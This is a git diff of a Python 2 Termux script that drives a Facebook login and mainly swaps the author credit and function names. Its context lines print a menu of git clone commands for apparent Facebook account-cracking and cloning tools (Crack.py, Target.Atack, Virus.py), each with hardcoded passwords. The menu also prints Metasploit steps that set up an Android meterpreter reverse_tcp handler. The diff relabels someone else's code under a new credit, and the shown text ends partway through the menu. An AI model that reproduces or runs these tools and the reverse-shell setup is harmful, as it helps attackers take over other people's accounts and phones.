@@ -1,6 +1,7 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Technical Shahid
+#The Credit For This Code Goes To Reginald Blechman aka Wrench
+# https://www.facebook.com/profile.php?id=100077717675619
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
@@ -41,7 +42,7 @@ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
-def keluar():
+def haHa():
 	print 'Good Bye'
 	os.sys.exit()
 
@@ -63,7 +64,7 @@ def cetak(b):
     sys.stdout.write(x+'\n')
 
 
-def jalan(z):
+def boom(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
@@ -1583,18 +1584,18 @@ print  """
 
 
 \033[1;95m«-----------------\033[1;91mReginald Blechman\033[1;95m-----------------»"""
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠀⠀⠀⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉\033[1;95m        ⠀WRENCH⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣆⠀⠀⠀  ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ") 
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡏⠀⠀⠀  ⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣠⣤⣤⣤⣴⣶⣾⣿⣿⣿⠀⠀⠀⠀ ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⡄⣴⠾⠟⢛⣿⡿⠋⠙⠛⠛⢿⡟⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⣴⣿⠋⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣶⣶⣶⣶⣶⣶⣿⣷⣶⣦⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")                                                                                                                                                                                                                                                          
-jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠀⠀⠀⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉\033[1;95m        ⠀WRENCH⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣆⠀⠀⠀  ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ") 
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡏⠀⠀⠀  ⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣠⣤⣤⣤⣴⣶⣾⣿⣿⣿⠀⠀⠀⠀ ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⡄⣴⠾⠟⢛⣿⡿⠋⠙⠛⠛⢿⡟⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⣴⣿⠋⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣶⣶⣶⣶⣶⣶⣿⣷⣶⣦⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+boom("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")                                                                                                                                                                                                                                                          
+boom("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 print "\033[1;95m«-----------------\0331;Reginald Blechman\033[1;95m-----------------»"
 CorrectUsername = "reginald"
 CorrectPassword = "wrench"
@@ -1678,10 +1679,10 @@ def pilih_login():
 	        os.system('xdg-open  https://www.facebook.com/profile.php?id=100077717675619')
 	        login()
 	elif peak =="0":
-		keluar()
+		haHa()
         else:
 		print"\033[1;91m[!] Wrong input"
-		keluar()
+		haHa()
 
 def login1():
 	os.system('clear')
@@ -1692,9 +1693,9 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo13
-		jalan(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;91mWarning  \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;91mWarning  \033[1;92mTermux All Version will Work ' )                 
+		boom(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
+		boom(' \033[1;91mWarning  \033[1;92mUse a New Account To Login' )
+		boom(' \033[1;91mWarning  \033[1;92mTermux All Version will Work ' )                 
 		print "\033[1;95m«-----------------\033[1;91mReginald Blechman\033[1;95m-----------------»"
 		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
 		print('	' )
@@ -1705,7 +1706,7 @@ def login1():
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;97mThere is no internet connection"
-			keluar()
+			haHa()
 		br._factory.is_html = True
 		br.select_form(nr=0)
 		br.form['email'] = id
@@ -1732,12 +1733,12 @@ def login1():
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;97mThere is no internet connection"
-				keluar()
+				haHa()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;97mYour Account is on Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
-			keluar()
+			haHa()
 		else:
 			print("\n\x1b[1;93mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
@@ -1770,7 +1771,7 @@ def menu():
 		login()
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
-		keluar()
+		haHa()
 	os.system("clear") #Dev:wrench
         time.sleep(0.05)
 	print logo2
@@ -1846,275 +1847,275 @@ def pilih():
 		os.system('clear')
 		print logo10
 		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m---------------»"
-                jalan('\033[1;92m............Massage..........')
-		jalan('\033[1;95mID Not Found Problum Salution Menu 5 Num Option')
-                jalan("\033[1;96mTermux  Data Clear Every Day")
-                jalan('\033[1;96mCommand Complet  98% ')
-                jalan('\033[1;96mCommand Update Every day')
-                jalan("\033[1;93m.......All..Command...........")
-                jalan('\033[1;91⭕No1⭕')
-                jalan('\033[1;96mapt update')
-                jalan('\033[1;96mapt upgrade')
-                jalan('\033[1;96mpkg install python')
-                jalan('\033[1;96mpkg install python2')
-                jalan('\033[1;96mpkg install git')
-                jalan('\033[1;96mpip2 install requests')
-                jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/lovehacker404/World")
-                jalan('\033[1;96mcd World')
-                jalan('\033[1;96mpython2 Cloning.py')
-                jalan('\033[1;96mUser:Black')
-                jalan('\033[1;96mpass:Mafia')
-                jalan('\033[1;92m👆Copy Command & send 2 groups👆')
-                jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
-                jalan('\033[1;92m⭕No2⭕')
-                jalan('\033[1;91mapt update')
-                jalan('\033[1;91mapt upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
-                jalan('\033[1;91mcd WorldCloning')
-                jalan('\033[1;91mpython2 World.py')
-                jalan('\033[1;91mUser Name : World')
-                jalan('\033[1;91mPassword   : lovehacker')
-                jalan('\033[1;97m⭕No3⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Cobra')
-                jalan('\033[1;91mcd Cobra')
-                jalan('\033[1;91mpython2 Scorpion.py')
-                jalan('\033[1;91mUser Name :  Cobra')
-                jalan('\033[1;91mPassword: lovehacker')
-                jalan('\033[1;96m⭕No4⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/lov3Hak3r/')
-                jalan('\033[1;91mcd lov3Hak3r')
-                jalan('\033[1;91mpython2 lovehacker.py')
-                jalan('\033[1;95m⭕No5⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafia2020/')
-                jalan('\033[1;91mcd BlackMafia2020')
-                jalan('\033[1;91mpython2 lovehacker')
-                jalan('\033[1;91mUser Name:Corona')
-                jalan('\033[1;91mPassword  :lovehacker')
-                jalan('\033[1;94m⭕No6⭕')
-                jalan('\033[1;91mpkg update ')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/CoviD-19/')
-                jalan('\033[1;91mcd CoviD-19')
-                jalan('\033[1;91mpython2 Virus.py')
-                jalan('\033[1;91mUser Name: Corona')
-                jalan('\033[1;91mpasword: lovehacker')
-                jalan('\033[1;93m⭕No7⭕')
-                jalan('\033[1;91mpkg update ')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python2 ')
-                jalan('\033[1;91mpkg install git ')
-                jalan('\033[1;91mpip2 install mechanize ')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Dragon/')
-                jalan('\033[1;91mcd Dragon')
-                jalan('\033[1;91mpython2 lovehacker.py')
-                jalan('\033[1;91mUserName:  Dragon')
-                jalan('\033[1;91mPassword:  lovehacker')
-                jalan('\033[1;92m⭕No8⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/KaliIndia/')
-                jalan('\033[1;91mcd KaliIndia')
-                jalan('\033[1;91mpython2 kalilinux.India.py')
-                jalan('\033[1;91mUser Name: India')
-                jalan('\033[1;91mPassword:lovehacker')
-                jalan('\033[1;97m⭕No9⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Testing')
-                jalan('\033[1;91mcd Testing')
-                jalan('\033[1;91mpython2 Project.py')
-                jalan('\033[1;91mUser Name: Testing')
-                jalan('\033[1;91mpasword: lovehacker')
-                jalan('\033[1;96m⭕No10⭕')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Target.Atack/')
-                jalan('\033[1;91mcd Target.Atack')
-                jalan('\033[1;91mls')
-                jalan('\033[1;91mcat README.md')
-                jalan('\033[1;91mchmod +x Target.py')
-                jalan('\033[1;91mls')
-                jalan('\033[1;91mnano password.txt')
-                jalan('\033[1;91mls')
-                jalan('\033[1;91mpwd')
-                jalan('\033[1;91mstorage file location password.txt')
-                jalan('\033[1;91mpython2 Target.py')
-                jalan('\033[1;95m⭕No11⭕')
-                jalan('\033[1;91mapt update')
-                jalan('\033[1;91mapt upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/fblite')
-                jalan('\033[1;91mcd fblite')
-                jalan('\033[1;91mpython2 Crack.py')
-                jalan('\033[1;94m⭕No12⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/india/')
-                jalan('\033[1;91mcd india')
-                jalan('\033[1;91mpython2 india.py')
-                jalan('\033[1;91mUser name. KashmirBanyGa')
-                jalan('\033[1;91mpasword.Pakistan')
-                jalan('\033[1;93m⭕No13⭕')
-                jalan('\033[1;91mpkg install python2 ')
-                jalan('\033[1;91mpip2 install mechanize ')
-                jalan('\033[1;91mpip2 install requests ')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaNew1.12/')
-                jalan('\033[1;91mls ')
-                jalan('\033[1;91mcd BlackMafiaNew1.12')
-                jalan('\033[1;91mpython2 lovehacker')
-                jalan('\033[1;91muser name. lovehacker')
-                jalan('\033[1;91mpassword . 03094161457')
-                jalan('\033[1;92m⭕No14⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/RedMoonNew/')
-                jalan('\033[1;91mcd RedMoonNew')
-                jalan('\033[1;91mpython2 lovehacker')
-                jalan('\033[1;91mUser Name:: RedMoonNew')
-                jalan('\033[1;91mPassword:: lovehacker')
-                jalan('\033[1;97m⭕No15⭕')
-                jalan('\033[1;91mapt update')
-                jalan('\033[1;91mapt upgrade')
-                jalan('\033[1;91mapt install git')
-                jalan('\033[1;91mapt install python ')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Install/')
-                jalan('\033[1;91mcd Install')
-                jalan('\033[1;91mls ')
-                jalan('\033[1;91mchmod +x *')
-                jalan('\033[1;91mls')
-                jalan('\033[1;91mpython all.py')
-                jalan('\033[1;96m⭕No16⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/NetHunting')
-                jalan('\033[1;91mcd NetHunting')
-                jalan('\033[1;91mpython2 NetHunting.py')
-                jalan('\033[1;91mUser Name : linux')
-                jalan('\033[1;91mPassword   : lovehacker')
-                jalan('\033[1;95m⭕No17⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
-                jalan('\033[1;91mcd WorldCloning')
-                jalan('\033[1;91mpython2 World.py')
-                jalan('\033[1;91mUser Name : World')
-                jalan('\033[1;91mPassword   : lovehacker')
-                jalan('\033[1;94m⭕No18⭕')
-                jalan('\033[1;91mpkg update')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python')
-                jalan('\033[1;91mpkg install python2')
-                jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BangBang/')
-                jalan('\033[1;91mcd BangBang')
-                jalan('\033[1;91mpython2 Mafia')
-                jalan('\033[1;91mUser Name: Pakistan')
-                jalan('\033[1;91mpasword: lovehacker')
-                jalan('\033[1;93m⭕No19⭕')
-                jalan('\033[1;91mpkg update ')
-                jalan('\033[1;91mpkg upgrade')
-                jalan('\033[1;91mpkg install python2 ')
-                jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mpkg install git ')
-                jalan('\033[1;91mpip2 install mechanize ')
-                jalan('\033[1;91mpip2 install requests ')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaError')
-                jalan('\033[1;91mcd BlackMafiaError')
-                jalan('\033[1;91mpython2 Error.py')
-                jalan('\033[1;92m⭕No20⭕')
-                jalan('\033[1;91mapt update')
-                jalan('\033[1;91mapt upgrade -y ')
-                jalan('\033[1;91mpkg install python -y ')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Black_Mafia')
-                jalan('\033[1;91mcd Black_Mafia')
-                jalan('\033[1;91mpython3 Black_Mafia.py')
-                jalan('\033[1;91m#Metasploit Commands')
-                jalan('\033[1;91m》》Requirements:-')
-                jalan('\033[1;91m1: Termux App (From Playstore)')
-                jalan('\033[1;91m2: Good Internet connection  (Must)')
-                jalan('\033[1;91m3: 2GB free Storage  (Must)')
-                jalan('\033[1;91m4: Android Version 5.0+ (Must)')
-                jalan('\033[1;91m5: 4GB+ RAM')
-                jalan('\033[1;91m6: Fast Processor')
-                jalan('\033[1;91m#installation')
-                jalan('\033[1;91m1: pkg update')
-                jalan('\033[1;91m2: pkg upgrade')
-                jalan('\033[1;91m3: pkg install unstable-repo')
-                jalan('\033[1;91m4: pkg install metasploit')
-                jalan('\033[1;91m5: msfconsole')
-                jalan('\033[1;91m6: use exploit/multi/handler')
-                jalan('\033[1;91m7: set payload android/meterpreter/reverse_tcp ')
-                jalan('\033[1;91m8: set lhost ')
-                jalan('\033[1;91m9: set lport 8080')
-                jalan('\033[1;91m10: exploit')
+                boom('\033[1;92m............Massage..........')
+		boom('\033[1;95mID Not Found Problum Salution Menu 5 Num Option')
+                boom("\033[1;96mTermux  Data Clear Every Day")
+                boom('\033[1;96mCommand Complet  98% ')
+                boom('\033[1;96mCommand Update Every day')
+                boom("\033[1;93m.......All..Command...........")
+                boom('\033[1;91⭕No1⭕')
+                boom('\033[1;96mapt update')
+                boom('\033[1;96mapt upgrade')
+                boom('\033[1;96mpkg install python')
+                boom('\033[1;96mpkg install python2')
+                boom('\033[1;96mpkg install git')
+                boom('\033[1;96mpip2 install requests')
+                boom('\033[1;96mpip2 install mechanize') 
+                boom("\033[1;96mgit clone https://github.com/lovehacker404/World")
+                boom('\033[1;96mcd World')
+                boom('\033[1;96mpython2 Cloning.py')
+                boom('\033[1;96mUser:Black')
+                boom('\033[1;96mpass:Mafia')
+                boom('\033[1;92m👆Copy Command & send 2 groups👆')
+                boom('\033[1;91mYoutube Chenal Like Subscrib plzz')
+                boom('\033[1;92m⭕No2⭕')
+                boom('\033[1;91mapt update')
+                boom('\033[1;91mapt upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
+                boom('\033[1;91mcd WorldCloning')
+                boom('\033[1;91mpython2 World.py')
+                boom('\033[1;91mUser Name : World')
+                boom('\033[1;91mPassword   : lovehacker')
+                boom('\033[1;97m⭕No3⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/Cobra')
+                boom('\033[1;91mcd Cobra')
+                boom('\033[1;91mpython2 Scorpion.py')
+                boom('\033[1;91mUser Name :  Cobra')
+                boom('\033[1;91mPassword: lovehacker')
+                boom('\033[1;96m⭕No4⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/lov3Hak3r/')
+                boom('\033[1;91mcd lov3Hak3r')
+                boom('\033[1;91mpython2 lovehacker.py')
+                boom('\033[1;95m⭕No5⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafia2020/')
+                boom('\033[1;91mcd BlackMafia2020')
+                boom('\033[1;91mpython2 lovehacker')
+                boom('\033[1;91mUser Name:Corona')
+                boom('\033[1;91mPassword  :lovehacker')
+                boom('\033[1;94m⭕No6⭕')
+                boom('\033[1;91mpkg update ')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/CoviD-19/')
+                boom('\033[1;91mcd CoviD-19')
+                boom('\033[1;91mpython2 Virus.py')
+                boom('\033[1;91mUser Name: Corona')
+                boom('\033[1;91mpasword: lovehacker')
+                boom('\033[1;93m⭕No7⭕')
+                boom('\033[1;91mpkg update ')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python2 ')
+                boom('\033[1;91mpkg install git ')
+                boom('\033[1;91mpip2 install mechanize ')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/Dragon/')
+                boom('\033[1;91mcd Dragon')
+                boom('\033[1;91mpython2 lovehacker.py')
+                boom('\033[1;91mUserName:  Dragon')
+                boom('\033[1;91mPassword:  lovehacker')
+                boom('\033[1;92m⭕No8⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/KaliIndia/')
+                boom('\033[1;91mcd KaliIndia')
+                boom('\033[1;91mpython2 kalilinux.India.py')
+                boom('\033[1;91mUser Name: India')
+                boom('\033[1;91mPassword:lovehacker')
+                boom('\033[1;97m⭕No9⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/Testing')
+                boom('\033[1;91mcd Testing')
+                boom('\033[1;91mpython2 Project.py')
+                boom('\033[1;91mUser Name: Testing')
+                boom('\033[1;91mpasword: lovehacker')
+                boom('\033[1;96m⭕No10⭕')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/Target.Atack/')
+                boom('\033[1;91mcd Target.Atack')
+                boom('\033[1;91mls')
+                boom('\033[1;91mcat README.md')
+                boom('\033[1;91mchmod +x Target.py')
+                boom('\033[1;91mls')
+                boom('\033[1;91mnano password.txt')
+                boom('\033[1;91mls')
+                boom('\033[1;91mpwd')
+                boom('\033[1;91mstorage file location password.txt')
+                boom('\033[1;91mpython2 Target.py')
+                boom('\033[1;95m⭕No11⭕')
+                boom('\033[1;91mapt update')
+                boom('\033[1;91mapt upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/fblite')
+                boom('\033[1;91mcd fblite')
+                boom('\033[1;91mpython2 Crack.py')
+                boom('\033[1;94m⭕No12⭕')
+                boom('\033[1;91mpkg update')
+                boom('\033[1;91mpkg upgrade')
+                boom('\033[1;91mpkg install python')
+                boom('\033[1;91mpkg install python2')
+                boom('\033[1;91mpkg install git')
+                boom('\033[1;91mpip2 install requests')
+                boom('\033[1;91mpip2 install mechanize')
+                boom('\033[1;91mgit clone https://github.com/lovehacker404/india/')
+                boom('\033[1;91mcd india')
+                boom('\033[1;91mpython2 india.py')
+                boom('\033[1;91mUser name. KashmirBanyGa')
+                boom('\033[1;91mpasword.Pakistan')
+                boom('\033[1;93m⭕No13⭕')
+                boom('\033[1;91mpkg install python2 ')
+                boom('\033[1;91mpip2 install mechanize ')
+                boom('\033[1;91mpip2 install requests ')
+                boom('\033[1;91mpkg install git')
